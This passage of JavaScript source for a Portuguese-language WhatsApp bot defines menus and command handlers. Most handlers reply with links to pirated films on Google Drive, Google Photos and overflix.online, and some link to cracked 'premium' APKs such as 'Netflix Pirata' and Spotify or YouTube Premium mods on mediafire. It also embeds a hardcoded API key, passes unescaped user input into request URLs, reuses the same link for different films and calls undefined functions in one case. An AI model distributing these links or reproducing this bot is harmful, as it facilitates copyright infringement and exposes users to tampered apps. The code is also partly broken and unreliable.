{title: "✰ۜۜ͜͡𝐒𝐡.& 𝐒𝐑𝐀.𝐒𝐌𝐈𝐓𝐇🎥", rowId: `${prefix}filme43`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐔𝐌 𝐋𝐀𝐂̧𝐎 𝐃𝐄 𝐀𝐌𝐎𝐑🎥", rowId: `${prefix}filme44`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐑𝐀𝐍𝐒𝐅𝐎𝐑𝐌𝐄𝐒 (𝐓𝐎𝐃𝐎𝐒)🎥", rowId: `${prefix}filme45`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎𝐈𝐓𝐎 𝐌𝐔𝐋𝐇𝐄𝐑𝐄𝐒 𝐄 𝐔𝐌 𝐒𝐄𝐆𝐑𝐄𝐃𝐎🎥", rowId: `${prefix}filme46`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀 𝐆𝐀𝐑𝐎𝐓𝐀 𝐍𝐎 𝐓𝐑𝐄𝐌:🎥", rowId: `${prefix}filme47`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐄𝐑𝐕𝐄:🎥", rowId: `${prefix}filme48`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐒𝐐𝐔𝐀𝐃𝐑𝐀̃𝐎 6🎥", rowId: `${prefix}filme49`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀 𝐂𝐇𝐄𝐆𝐀𝐃𝐀🎥", rowId: `${prefix}filme50`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐉𝐔𝐌𝐀𝐍𝐉𝐈-𝐁𝐄𝐌 𝐕𝐈𝐍𝐃𝐎 𝐀 𝐒𝐄𝐋𝐕𝐀🎥", rowId: `${prefix}filme51`, description: `${NomeDoBot}`},
{title: "✰ۜ͜͡𝐌𝐎𝐍𝐓𝐄 𝐂𝐀𝐑𝐋𝐎🎥", rowId: `${prefix}filme52`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐀𝐒𝐂𝐄 𝐔𝐌𝐀 𝐄𝐒𝐓𝐑𝐄𝐋𝐀🎥", rowId: `${prefix}filme53`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐈𝐒𝐓𝐄́𝐑𝐈𝐎 𝐍𝐎 𝐌𝐄𝐃𝐈𝐓𝐄𝐑𝐑𝐀̂𝐍𝐄𝐎🎥", rowId: `${prefix}filme54`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐎𝐑𝐁𝐈𝐓🎥", rowId: `${prefix}filme55`, description: `${NomeDoBot}`}]
}]
 
const listMessage2 = {
text: `Bem vindo(a), *${pushname}*,\nSelecione quantos você desejar.`,
  footer: `By: ${NomeDoBot}`,
  title: `ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐅𝐈𝐋𝐌𝐄𝐒ꫂ`,
  buttonText: "🌪️𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🌪️️",
  sections
}
sendMsg = await conn.sendMessage(sender, listMessage2, {quoted: selo2})
}
break

case 'filme1':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Brinquedos do terror:* https://overflix.online/filmes/brinquedos-do-terror/`)

break

case 'filme2':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Homem Aranha sem volta pra casa:* https://drive.google.com/file/d/1jNUcLsJqRNcrYD_pMkrUc066TIEWhFRf/view?usp=drivesdk`)

break

case 'filme3':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Cidade perdida:* https://overflix.online/filmes/cidade-perdida-online/`)

break

case 'filme4':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Thor amor e trovão:* https://overflix.online/filmes/thor-amor-e-trovao-hd-gratis-online/`)

break

case 'filme5':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Pinoquio 2:* https://overflix.online/filmes/pinoquio-2/`)

break

case 'filme6':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Rua do Medo - Parte 1:* https://overflix.online/filmes/rua-do-medo-1994-parte-1/`)

break

case 'filme7':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Na mente do demônio:* https://overflix.online/filmes/na-mente-do-demonio/`)

break

case 'filme8':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *O homem nas trevas:* https://overflix.online/filmes/o-homem-nas-trevas-2-online-hd/`)

break

case 'filme9':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

*Compilados de Terror:* https://overflix.online/?s=Terror`)

break

case 'filme10':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Halloween Kills: O terror continua:* https://overflix.online/filmes/halloween-kills-o-terror-continua/`)

break

case 'filme11':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}


O predador a caçada: https://overflix.online/filmes/o-predador-a-cacada/`)

break

case 'filme12':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Os primeiros passos de Groot:* https://overflix.online/filmes/os-primeiros-passos-de-groot/`)

break

case 'filme13':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Tá chovendo hambúrguer 2:* https://overflix.online/filmes/ta-chovendo-hamburguer-2/`)

break

case 'filme14':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Minions a origem do gru:* https://overflix.online/filmes/minions-2-a-origem-de-gru/`)

break

case 'filme15':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *The Sandman:* https://overflix.online/series/the-sandman-online-hd-gratis/`)

break

case 'filme16':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *The Batman:* https://photos.app.goo.gl/F6zsDNxipwYdxS9s9`)

break
case 'pago':
reply(`❗ Você não realizou o pix!`)

break

case 'filme17':
reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *As branquelas:* https://drive.google.com/file/d/1avm4yXd2tg1lZKy00yZRknboNv2Dxqpi/view?usp=drivesdk`)

break

case 'filme18':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Interestelar:* https://drive.google.com/file/d/10nSkrlV_TwkqtyFJ_h-c3GlLx-E7nqz9/view?usp=drivesdk`)

break

case 'filme19':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Um olhar do paraíso:* https://drive.google.com/file/d/102IWrzkbMAYDxkPmwMuHDuKFK3HGVFWF/view?usp=drivesdk`)

break

case 'filme20':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Barbie:* https://drive.google.com/drive/folders/1-yFkZrcyph8b1l4yrPpD7oaF5DHD7wss`)

break

case 'filme21':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Maze Runner:* https://photos.app.goo.gl/D68AJD4SgQmvMyjY7`)

break

case 'filme22':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Mad Max:* https://photos.app.goo.gl/88nQZhtu7v3ZWbNe6`)

break

case 'filme23':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Homem Aranha:* https://photos.app.goo.gl/mLzQtYumEfMpYQ4p7`)

break

case 'filme24':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Sherlock Homes:* https://photos.app.goo.gl/Eg5dJLspQhcaznAv5`)

break

case 'filme25':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Cinquenta tons de cinza:* https://photos.app.goo.gl/3QoCnRNfwJ83KBau6`)

break

case 'filme26':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Crepúsculo:* https://photos.app.goo.gl/9etPkcZVG42Ngzm29`)

break

case 'filme27':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Bad Boys:* https://photos.app.goo.gl/sVdfEwLKzg4sghxx6`)

break

case 'filme28':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Vingadores:* https://photos.app.goo.gl/uQRWCRbrLc5yPgPi8`)

break

case 'filme29':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Velozes e Furiosos:* https://photos.app.goo.gl/dSJPea6tf5QEZMK77`)

break

case 'filme30':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Batman (1989 - 2016):* https://photos.app.goo.gl/x1ZywBqZFNoijUkA6`)

break

case 'filme31':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *As vantagens de ser invisível:* https://drive.google.com/file/d/12cnRyPwcXDTbbU26MF7wXhz9cnotdEoX/view?usp=drivesdk`)

break

case 'filme32':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Moana:* https://drive.google.com/file/d/1aHVoN-kWxIvdQBi9a6OMSqXws7q674Cr/view?usp=drivesdk`)

break

case 'filme33':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Programação para princesas:* https://drive.google.com/file/d/1aHVoN-kWxIvdQBi9a6OMSqXws7q674Cr/view?usp=drivesdk`)

break

case 'filme34':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *As crônicas de Nárnia:* https://drive.google.com/folderview?id=1QYz_a12LMrs0Trz2RyfcsrkoNYLsjpdg`)

break

case 'filme35':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Culpa é das estrelas:* https://drive.google.com/file/d/1ADMJxVpf0RLTJZBpjj_lb0KRGb_OQHs1/view`)

break

case 'filme36':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Garota infernal:* https://drive.google.com/file/d/1cGSEO0tEPg44Yt1AcVXpNgdzMOXXZ64F/view?usp=drivesdk`)

break

case 'filme37':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Verdade ou Desafio:* https://drive.google.com/file/d/1mzr_E-OmjQpwouBx2oOo3y4qZStxN-2Z/view?usp=drivesdk`)

break

case 'filme38':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Com amor, Simon:* https://drive.google.com/file/d/1mzr_E-OmjQpwouBx2oOo3y4qZStxN-2Z/view?usp=drivesdk`)

break

case 'filme39':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *After 1:* https://drive.google.com/file/d/1YX8pGsFAY1vrKu8rl96VdN8-vhpUQ2mY/view?usp=drivesdk`)

break

case 'filme40':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *A 5 passos de você:* https://drive.google.com/file/d/132_vwYz5zXMQORAhWmTwQHlLZ47Tpu7V/view?usp=drivesdk`)

break

case 'filme41':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Hannah Montana:* https://drive.google.com/file/d/1Fx1Dn-JV8LOsfiBYL8-ihdz4b2fVnNbg/view?usp=drivesdk`)

break

case 'filme42':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Ponte para Terabitia:* https://drive.google.com/file/d/1F0iFKt2xgglz7pldUuMaE5gxLs55Ta7T/view?usp=drivesdk`)

break

case 'filme43':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Sr. & Sra. Smith:* https://drive.google.com/file/d/1bJsB7wjvU7WWuFSJzwcz0VKQ6vz2UMlA/view?usp=drivesdk`)

break

case 'filme44':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Um laço de amor:* https://drive.google.com/file/d/17x2Um_DDg7Px2y1EINwpA8jLdgDx-AeM/view?usp=drivesdk`)

break

case 'filme45':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Transformers:* https://drive.google.com/folderview?id=10QVCb14pAWod2rQ67n1BlLocP71yF8Ez`)

break

case 'filme46':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Oito mulheres e um segredo:* https://drive.google.com/file/d/1jNUcLsJqRNcrYD_pMkrUc066TIEWhFRf/view?usp=drivesdk`)

break

case 'filme47':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *A garota do trem:* https://drive.google.com/file/d/10nc2orAOhI_fLHWLCJfffuFVuUlKo158/view?usp=drivesdk`)

break

case 'filme48':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Nerve:* https://drive.google.com/file/d/1kbS-l4Af_PR_wFmykYAE_pq6qwfORWjD/view?usp=drivesdk`)

break

case 'filme49':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Esquadrão 6:* https://drive.google.com/file/d/13voArwUsQMgC3o7Q0ZIf87MKjQb3laU6/view?usp=drivesdk`)

break

case 'filme50':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

*A chegada:* https://drive.google.com/file/d/17ZTQ4VaUwM_m7immHx4XDWvR_fc1K0Vt/view?usp=drivesdk`)

break

case 'filme51':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Jumanji: Bem vindo a Selva:* https://drive.google.com/file/d/1j5puYj2JzBgDcH0QKIR__UY1o1Zvs022/view?usp=drivesdk`)

break

case 'filme52':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Monte Carlo:* https://drive.google.com/file/d/1GmN34mKHGd5rp82cX3LVv4mAzz1XoVbB/view?usp=drivesdk`)

break

case 'filme53':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Nasce uma estrela:* https://drive.google.com/file/d/1t8ZLbRMDsUhnzGMbjDie-7jTKDNxy7xF/view?usp=drivesdk`)

break

case 'filme54':

await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Mistério no Mediterrâneo:* https://drive.google.com/file/d/1J4JMLzT6qSgYl1nX75RIEPc4DVc7G9FS/view?usp=drivesdk`)

break

case 'filme55':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Norbit:* https://drive.google.com/file/d/1UkgrI-fM6rOAHmFEaABtJQP_Lx6jantD/view?usp=drivesdk`)
break


case 'listaapps':
case 'appspremium':
case 'apps': {
sections = [
{title: "",
rows: [
{title: "✰ۜۜ͜͡𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐏𝐑𝐄𝐌𝐈𝐔𝐌-𝐃𝐀𝐑𝐊👩🏻‍💻", rowId: `${prefix}app1`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐏𝐑𝐄𝐌𝐈𝐔𝐌-𝐁𝐋𝐀𝐂𝐊👩🏻‍💻", rowId: `${prefix}app2`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐘𝐎𝐔𝐂𝐔𝐓 𝐏𝐑𝐎👩🏻‍💻", rowId: `${prefix}app3`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐈𝐂𝐒𝐀𝐑𝐓 𝐏𝐑𝐄𝐌𝐈𝐔𝐌👩🏻‍💻", rowId: `${prefix}app4`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐍𝐀𝐏𝐓𝐔𝐁𝐄 𝐏𝐑𝐄𝐌𝐈𝐔𝐌👩🏻‍💻", rowId: `${prefix}app5`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐈𝐍𝐄𝐌𝐀𝐒𝐓𝐄𝐑 𝐏𝐑𝐎👩🏻‍💻", rowId: `${prefix}app6`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐏𝐈𝐑𝐀𝐓𝐀👩🏻‍💻", rowId: `${prefix}app7`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐎𝐖𝐄𝐑-𝐃𝐈𝐑𝐄𝐂𝐓𝐎𝐑 𝐏𝐑𝐎👩🏻‍💻", rowId: `${prefix}app8`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐏𝐎𝐓𝐈𝐅𝐘 𝐏𝐑𝐄𝐌𝐈𝐔𝐌👩🏻‍💻", rowId: `${prefix}app9`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐑𝐄𝐌𝐈𝐍𝐈 𝐏𝐑𝐎👩🏻‍💻", rowId: `${prefix}app10`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐓𝐈𝐎𝐍👩🏻‍💻", rowId: `${prefix}app11`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝐏𝐑𝐎👩🏻‍💻", rowId: `${prefix}app12`, description: `${setting.NomeDoBot}`}]
},
]
 
const listMessage2 = {
text: `Bem vindo(a), *${pushname}*,\nSelecione quantos você desejar.`,
  footer: `By: ${setting.NomeDoBot}`,
  title: `ꪶ𝐋𝐈𝐒𝐓𝐀-𝐀𝐏𝐋𝐈𝐂𝐀𝐓𝐈𝐕𝐎𝐒ꫂ️`,
  buttonText: "🔰𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🔰️",
  sections
}
sendMsg = await conn.sendMessage(sender, listMessage2, {quoted: info})
}
break

case 'app1':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

 📂 *Youtube Premium Tema Dark:* http://www.mediafire.com/file/x98arvls146n5i5/YouTube+Premium+15.43.32.apk/file
`)
break

case 'app2':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *Youtube Premium Tema Black:* http://www.mediafire.com/file/ourocauwy1hc3v1/YouTube+Black.apk/file
`)
break
case 'app3':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *YouCut Pro:* https://www.mediafire.com/file/5y6rp0t6ffgvnpm/YouCut-Pro-1.452.1119-SK_BR_CANAL.apk/file
`)
break
case 'app4':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *PicsArt Premium:* https://www.mediafire.com/file/dd1ej4z78uvdui8/base.apk/file
`)
break
case 'app5':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *Snaptube Premium:* http://www.mediafire.com/file/lfdc3ptkhear0w0/Snaptube_Premium_BY_FlashStudio.apk/file
`)
break
case 'app6':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *KineMaster Pro:* https://www.mediafire.com/file/itxxeuct5efo075/Kinemaster_Premium_Download_2021.apk/file
`)
break
case 'app7':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *Netflix Pirata:* https://apkmstore.blogspot.com/2020/06/download-apk-mediaflix-plus.html?m=1
`)
break
case 'app8':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *PowerDirector PRO:* https://www.mediafire.com/file/1et7hx53dwgjk89/PowerDirector_Premium_v9.2.0_ATUALIZADO_2021_PRO.om.apk/file
`)
break

case 'app9':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *Spotify Premium:* https://www.mediafire.com/file/5ajeu8dysva0pso/SPOTIFY_PREMIUM_100%2525_M%25C3%259ASICA_OFFLINE.apk/file`)
break

case 'app10':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *Remini Pro:* https://techgara.com/download/mod/remini-pro-31633-1357/`)
break

case 'app11':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *Alight Motion:* https://www.mediafire.com/file/k0vgr9dx2dwkrvj/Alight+Motion+(4.0)+Carllos10k.apk/file`)
break

case 'app12':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

📂 *Instagram Pro:* https://www.mediafire.com/file/pyl152gv0wzt6l5/InstaPro_v9.35_Prim%25C3%25A1rio_By.SamMods_.apk/file`)
break

case 'ytsearch': {
if(!q) return reply(`Cadê o link da playlist do YouTube?`)
reply(`Procurando! Aguarde ${pushname}!`)
var Lrows = []
let data = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/pesquisa_ytb?nome=${q}&apikey=@Luix1397`)
no = 0;
no += 1;
for(let a of data) {
Lrows.push({title: a.titulo, description: `Tipo: Audio >  Descrição ${a.desc}\nDuração: ${a.tempo}\nPostado: ${a.postado}`, rowId: `${prefix}ytmp3 ${a.url}`}, {title: a.titulo, description: `Tipo: Video >  Descrição ${a.desc}\nDuração: ${a.tempo}\nPostado: ${a.postado}`, rowId: `${prefix}ytmp4 ${a.url}`})
}
listMessage = {
text: `✅️ *Playlist Encontrada com Sucesso!* `,
footer: `Selecione para baixar uma ou mais músicas integradas a playlist localizada:`,
title: ``,
buttonText: "🎵𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃🎶",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(sender, listMessage)
}
break
case 'playstore':
try {
if(!q.length > 2) return reply("Cade o título do apk que deseja pesquisar?")
async function ytsrcbtt() {
var Lrows = []

let data = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/playstore?nome=${q}&apikey=@Luix1397`)

for(let a of data.resultados) {
Lrows.push({title: `${a.title}\n\n----------------------------------------------\n`, description: `ID: ${a.appId}\n\n----------------------------------------------\n\nURL: ${a.url}\n\n----------------------------------------------`, rowId: `a`})
}

listMessage = {
text: `> Buscando por: ${q}\nClique para ver as informações!`,
footer: `By: ${setting.NomeDoBot}`,
title: `⸺͟͞ꪶ𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀: 𝐏𝐋𝐀𝐘-𝐒𝐓𝐎𝐑𝐄ꫂ ✰✰`,
buttonText: "🎶𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🎶️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]

}
conn.sendMessage(sender, listMessage)
}
ytsrcbtt().catch(e => {
reply("Erro.")
})
} catch (e) {
return reply("Erro..")
}
break
case 'video2':
if (args.length < 1) return enviar('Use assim */play [Pesquisa]')
pesquisa = args.join(' ')
clover = await fetchJson(`https://app.clovermods17.repl.co/api/yt/playmp4?query=${pesquisa}&apikey=clover`)
subaru.sendMessage(from, {video: {url: clover.url}}, {quoted: selo})
break
/*𝐌𝐄𝐍𝐔𝐒*/

case 'menu2':
conn.sendMessage(from, { react: { text: `☕`, key: info.key }})
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/menucmd.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
}
img = fs.readFileSync('./luixft.jpg')  

conn.sendMessage(from,{image:img,caption: `
┌───────────────⊰
└┐❀֟፝֟͜͜͡͡͡👑✰͜͢͡️𝐈𝐍𝐅͢𝐎 𝐃͢𝐎𝐍͢𝐎️👑֟፝֟͜͜͡❀
┌┥⋟ 𝑩𝑶𝑻: ${NomeDoBot}
││⋟ 𝑫𝑶𝑵𝑶: ${NickDono}
││⋟ 𝑺𝑻𝑨𝑻𝑼𝑺:『 On-line 』
│└────────⊰
╠═══❖•ೋ°ৡ︎•+¹⁸👻+¹⁸•❖•ೋ°ৡ═══╗*
       『👻』❀֟፝֟͜͜͡͡͡𝄞⃟𝐌 𝐄 𝐍 𝐔❀֟፝֟͜͜͡͡͡𝄞⃟ 『👻』   
╠═══❖•ೋ°ৡ︎•+¹⁸👻+¹⁸•❖•ೋ°ৡ═══╝
║
╠┄┄┄⟨👻𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂̧𝐎̃𝐄𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menulogos
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Brincadeiras
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menuadms
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menulista
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menuadmsbotao
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menulogosbotao
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menuefeitosbotao
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menudono
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Listaapps
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Listajogos
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Listaseries
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Listafilmes
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menuanime
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menuhentai
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Alteradores
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menuprem
║
╠┄┄┄⟨👻𝐈𝐍𝐅𝐎/𝐃𝐎𝐍𝐎👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Fotomenu (MARCAR-IMG) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}audio-menu
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}verificado-global
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}console
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}botoes
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}InfoBemvindo
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infopalavrão
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infolistanegra
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infobancarac
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infovotação
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infocontador
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infosorteio
║
╠┄┄┄⟨👻𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Play (NOME) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Playmp4 (NOME) 
